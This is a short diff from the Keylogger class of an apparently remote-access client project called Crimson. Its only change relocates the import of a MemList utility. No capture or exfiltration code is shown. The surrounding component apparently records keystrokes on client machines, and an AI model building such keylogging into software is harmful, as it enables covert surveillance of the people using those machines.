@@ -30,11 +30,11 @@ import org.slf4j.LoggerFactory;
 
 import com.subterranean_security.crimson.client.Client;
 import com.subterranean_security.crimson.client.ClientStore;
+import com.subterranean_security.crimson.core.misc.MemList;
 import com.subterranean_security.crimson.core.net.ConnectionState;
 import com.subterranean_security.crimson.core.proto.Keylogger.EV_KEvent;
 import com.subterranean_security.crimson.core.proto.Keylogger.Trigger;
 import com.subterranean_security.crimson.core.proto.MSG.Message;
-import com.subterranean_security.crimson.core.storage.MemList;
 import com.subterranean_security.crimson.core.util.Native;
 
 public final class Keylogger {
